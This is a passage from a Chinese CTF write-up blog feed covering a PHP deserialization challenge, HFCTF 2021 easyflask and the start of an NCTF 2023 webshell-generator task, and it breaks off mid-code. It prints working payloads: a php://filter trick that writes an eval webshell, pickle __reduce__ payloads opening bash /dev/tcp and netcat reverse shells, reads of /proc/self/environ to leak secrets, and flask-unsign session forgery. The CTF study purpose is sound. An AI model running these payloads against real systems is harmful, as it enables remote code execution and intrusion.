class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="hljs-string">&quot;127.0.0.1&quot;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;&#123;Trump_:&quot;fake_news!&quot;&#125;&#x27;</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GWHT</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hero</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;hero = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yasuo</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;hero)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;hero-&gt;<span class="hljs-title function_ invoke__">hasaki</span>();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You don&#x27;t look very happy&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Yongen</span></span><br><span class="hljs-class"></span>&#123; <span class="hljs-comment">//flag.php</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;text = <span class="hljs-variable">$text</span>;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hasaki</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$d</span> = <span class="hljs-string">&#x27;&lt;?php die(&quot;nononon&quot;);?&gt;&#x27;</span>;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable">$d</span> . <span class="hljs-variable language_">$this</span>-&gt;text;<br>        @<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-variable">$a</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Yasuo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hasaki</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;I&#x27;m the best happy windy man&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Yongen</code>类下提示<code>flag.php</code>，<code>hasaki</code>函数虽然有<code>file_put_contents</code>但存在<code>die</code>这个东西。但：</p><p>参考资料：<a href="https://www.freebuf.com/articles/web/266565.html">死亡绕过</a></p><p>综上，exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GWHT</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hero</span><br>        ;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Yongen</span></span><br><span class="hljs-class"></span>&#123; <span class="hljs-comment">//flag.php</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;text = <span class="hljs-variable">$text</span>;<br><br>    &#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">GWHT</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yongen</span>();<br><span class="hljs-variable">$a</span> -&gt;hero = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span> -&gt;file = <span class="hljs-string">&#x27;php://filter/write=convert.base64-decode/resource=r.php&#x27;</span>;<br><span class="hljs-variable">$b</span> -&gt;text = <span class="hljs-string">&#x27;aaaPD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=&#x27;</span>;<span class="hljs-comment">// &lt;?php eval($_POST[&#x27;a&#x27;]);?&gt;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p>最后有一个注意的点是<code>&lt;?php die(&quot;nononon&quot;);?&gt;</code>这东西包含不符合<code>base64</code>编码的字符范围，相当于解码<code>phpdienononon</code>共13个字符，<code>base64</code>解码时四个比特一组，所以要随便补三个字符。</p><p>然后就是传给哪个参数的问题，Arjun直接扫就行(懒得弄了)。</p><p>综上：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?path<span class="hljs-operator">=</span>http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/star<span class="hljs-number">1</span>.php&amp;<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>O<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>GWHT<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>hero<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BO<span class="hljs-variable">%3</span>A<span class="hljs-number">6</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>Yongen<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">2</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>file<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">55</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>php<span class="hljs-variable">%3</span>A<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>Ffilter<span class="hljs-variable">%2</span>Fwrite<span class="hljs-variable">%3</span>Dconvert.base<span class="hljs-number">64</span>-decode<span class="hljs-variable">%2</span>Fresource<span class="hljs-variable">%3</span>Dr.php<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>text<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">39</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>aaaPD<span class="hljs-number">9</span>waHAgZXZhbCgkX<span class="hljs-number">1</span>BPU<span class="hljs-number">1</span>RbJ<span class="hljs-number">2</span>EnXSk<span class="hljs-number">7</span>Pz<span class="hljs-number">4</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<span class="hljs-variable">%7</span>D<br></code></pre></td></tr></table></figure><p>不url编码一下也行：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?p</span>ath=<span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/127.0.0.1/star</span>1.php&amp;c=<span class="hljs-symbol">O:</span><span class="hljs-number">4</span><span class="hljs-symbol">:<span class="hljs-string">&quot;GWHT&quot;</span></span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span>&#123;<span class="hljs-symbol">s:</span><span class="hljs-number">4</span><span class="hljs-symbol">:<span class="hljs-string">&quot;hero&quot;</span></span>;<span class="hljs-symbol">O:</span><span class="hljs-number">6</span><span class="hljs-symbol">:<span class="hljs-string">&quot;Yongen&quot;</span></span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span>&#123;<span class="hljs-symbol">s:</span><span class="hljs-number">4</span><span class="hljs-symbol">:<span class="hljs-string">&quot;file&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">55</span><span class="hljs-symbol">:<span class="hljs-string">&quot;php://filter/write=convert.base64-decode/resource=1.php&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">4</span><span class="hljs-symbol">:<span class="hljs-string">&quot;text&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">39</span><span class="hljs-symbol">:<span class="hljs-string">&quot;aaaPD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=&quot;</span></span>;&#125;&#125;<br></code></pre></td></tr></table></figure><h4 id="思路总结：-8"><a href="#思路总结：-8" class="headerlink" title="思路总结："></a>思路总结：</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">file<span class="hljs-constructor">_put_contents(&#x27;<span class="hljs-params">php</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">filter</span><span class="hljs-operator">/</span><span class="hljs-params">write</span>=<span class="hljs-params">convert</span>.<span class="hljs-params">base64</span>-<span class="hljs-params">decode</span><span class="hljs-operator">/</span><span class="hljs-params">resource</span>=<span class="hljs-params">r</span>.<span class="hljs-params">php</span>&#x27;,&#x27;PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=&#x27;)</span><br></code></pre></td></tr></table></figure><p>这东西意思是把base64编码后的数据写到<code>r.php</code>中。所以我们可以利用这种方法去绕过类似<code>exit(),die()</code>这种函数(因为被当成base64写到指定文件里了，失去了原本的意义)。</p><p><a href="https://xz.aliyun.com/t/8163?time__1311=n4+xuDgDBDyGKAKD=D7Dl1oQ30I34mwrxiKx&alichlgref=https://www.cnblogs.com/#toc-1">参考文章2</a></p><p><a href="https://xiaolong22333.top/archives/114/">参考文章3</a></p><h2 id="HFCTF-2021-Final-easyflask"><a href="#HFCTF-2021-Final-easyflask" class="headerlink" title="[HFCTF 2021 Final]easyflask"></a>[HFCTF 2021 Final]easyflask</h2><p>跟着提示做：</p><p><img src="/img/hfctf2021final1.png" alt="hfctf2021final1"></p><p>存在任意文件读取？试试<code>/etc/passwd</code>:</p><p><img src="/img/hfctf2021final2.png" alt="hfctf2021final2"></p><p><img src="/img/hfctf2021final3.png" alt="hfctf2021final3"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3.6</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, session<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&quot;SECRET_KEY&quot;</span>] = <span class="hljs-string">&quot;*******&quot;</span><br><br><span class="hljs-comment"># 定义 User 类</span><br>User = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;User&#x27;</span>, (<span class="hljs-built_in">object</span>,), &#123;<br>    <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>,<br>    <span class="hljs-string">&#x27;is_admin&#x27;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-string">&#x27;__repr__&#x27;</span>: <span class="hljs-keyword">lambda</span> o: o.uname,<br>&#125;)<br><br><span class="hljs-comment"># 处理根路径</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=(<span class="hljs-params"><span class="hljs-string">&#x27;GET&#x27;</span>,</span>)</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index_handler</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;u&#x27;</span>):<br>        u = pickle.dumps(User())<br>        session[<span class="hljs-string">&#x27;u&#x27;</span>] = u<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;/file?file=index.js&quot;</span><br><br><span class="hljs-comment"># 处理文件路径</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/file&#x27;</span>, methods=(<span class="hljs-params"><span class="hljs-string">&#x27;GET&#x27;</span>,</span>)</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">file_handler</span>():<br>    path = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>)<br>    path = os.path.join(<span class="hljs-string">&#x27;static&#x27;</span>, path)<br>    <br>    <span class="hljs-comment"># 检查路径合法性</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path) <span class="hljs-keyword">or</span> os.path.isdir(path) \<br>            <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.py&#x27;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.sh&#x27;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;..&#x27;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> path:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;disallowed&#x27;</span><br><br>    <span class="hljs-comment"># 读取文件内容并返回</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> fp:<br>        content = fp.read()<br>    <span class="hljs-keyword">return</span> content<br><br><span class="hljs-comment"># 处理管理员页面</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>, methods=(<span class="hljs-params"><span class="hljs-string">&#x27;GET&#x27;</span>,</span>)</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin_handler</span>():<br>    <span class="hljs-keyword">try</span>:<br>        u = session.get(<span class="hljs-string">&#x27;u&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(u, <span class="hljs-built_in">dict</span>):<br>            u = b64decode(u.get(<span class="hljs-string">&#x27;b&#x27;</span>))<br>            u = pickle.loads(u)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;uhh?&#x27;</span><br><br>    <span class="hljs-comment"># 检查用户是否为管理员</span><br>    <span class="hljs-keyword">if</span> u.is_admin == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;welcome, admin&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;who are you?&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p>先抓包看下<code>session</code>:，python的话估计是<code>JWT</code>:</p><p><img src="/img/hfctf2021final4.png" alt="hfctf2021final4"></p><p><code>b</code>键对应的<code>base</code>64，在<code>/admin</code>路由下会进行处理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">u = b64decode(u.get(<span class="hljs-string">&#x27;b&#x27;</span>))<br>u = pickle.loads(u)<br></code></pre></td></tr></table></figure><p>后面想着怎么读<code>secret_key</code>，之前碰到过读<code>/proc/self/environ</code>的，试试：</p><p><img src="/img/hfctf2021final6.png" alt="hfctf2021final6"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">secret_key=glzji<span class="hljs-symbol">n22948575858</span>jfjfjufirijidjit<span class="hljs-name">g3</span>uiiuuh<br></code></pre></td></tr></table></figure><p>还读了<code>/proc/1/environ</code>，直接拿到flag了：</p><p><img src="/img/hfctf2021final7.png" alt="hfctf2021final7"></p><p>正常做的话就是python反序列化+session伪造执行命令(这里直接反弹shell了，没试能不能执行ls啥的)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">import</span> os<br>        cmd = <span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/IP/9001 0&gt;&amp;1&#x27;&quot;</span><br>        <span class="hljs-keyword">return</span> (os.system, (cmd,))<br>u = pickle.dumps(User())<br><span class="hljs-built_in">print</span>(b64encode(u))<br></code></pre></td></tr></table></figure><p><code>flask-unsigh</code>用法：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">flask-unsign <span class="hljs-attr">--unsign</span> <span class="hljs-attr">--decode</span> <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;eyJ1Ijp7IiBiIjoiZ0FTVkdBQUFBQUFBQUFDTUNGOWZiV0ZwYmw5ZmxJd0VWWE5sY3BTVGxDbUJsQzQ9In19.ZbCRbw.VSVb2deVeKAEUTAotx5adFSrhgY&quot;</span> <span class="hljs-attr">--secret</span> <span class="hljs-string">&#x27;glzjin22948575858jfjfjufirijidjitg3uiiuuh&#x27;</span> <span class="hljs-attr">--no-literal-eval</span><br><br>flask-unsign <span class="hljs-attr">--sign</span> <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;gASVTwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDRiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzQzLjEyOC43LjExNy85MDAxIDA+JjEnlIWUUpQu&#x27;&#125;&#125;&quot;</span> <span class="hljs-attr">--secret</span> <span class="hljs-string">&#x27;glzjin22948575858jfjfjufirijidjitg3uiiuuh&#x27;</span> <span class="hljs-attr">--no-literal-eval</span><br></code></pre></td></tr></table></figure><p>后面看了下，还有其它写法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><br>User = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;User&#x27;</span>, (<span class="hljs-built_in">object</span>,), &#123;<br>    <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>,<br>    <span class="hljs-string">&#x27;is_admin&#x27;</span>: <span class="hljs-number">1</span>,<br>    <span class="hljs-string">&#x27;__repr__&#x27;</span>: <span class="hljs-keyword">lambda</span> o: o.uname,<br>    <span class="hljs-string">&#x27;__reduce__&#x27;</span>: <span class="hljs-keyword">lambda</span> o: (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;nc IP PORT -e /bin/sh&#x27;)&quot;</span>,))<br><br>&#125;)<br><br>u = pickle.dumps(User())<br><span class="hljs-built_in">print</span>(b64encode(u).decode())<br><span class="hljs-comment">#或者：</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">import</span> os<br>        cmd = <span class="hljs-string">&quot;cat /flag &gt; /tmp/test1&quot;</span><br>        <span class="hljs-keyword">return</span> (os.system, (cmd,))<br></code></pre></td></tr></table></figure><h4 id="思路总结：-9"><a href="#思路总结：-9" class="headerlink" title="思路总结："></a>思路总结：</h4><p>简单<code>python</code>反序列化和<code>session</code>结合，任意文件读取，<code>/proc</code>。</p>]]></content>
    
    
    
    <tags>
      
      <tag>做题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023_NCTF_Web部分题目复现</title>
    <link href="/2023/12/31/2023NCTF_web%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/12/31/2023NCTF_web%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>芜湖，爆零了 :) </p><span id="more"></span><hr><h3 id="Webshell-Generator"><a href="#Webshell-Generator" class="headerlink" title="Webshell Generator"></a>Webshell Generator</h3><blockquote><p> 题目描述：生成你的专属Webshell！</p></blockquote><p>一句话木马生成器，可以控制请求方法、密钥和文件名称，点了生成会自动下载一句话木马文件：</p><p><img src="/img/2023nctfwebshell2.png" alt="2023nctfwebshell2"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//webshell.php</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;114&quot;</span>]);<br></code></pre></td></tr></table></figure><p>这里很容易想到任意文件下载，抓个包：</p><p><img src="/img/2023nctfwebshell5.png" alt="2023nctfwebshell5"></p><p><code>POST</code>之后会重定向到<code>download.php</code>页面下载文件，<code>URL</code>格式：<code>download.php?file=/tmp/i4ar6mxnweaozfl9&amp;filename=webshell.php</code>。通过修改<code>file</code>尝试下载<code>download.php</code>和<code>index.php</code></p><p><img src="/img/2023nctfwebshell6.png" alt="2023nctfwebshell6"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span 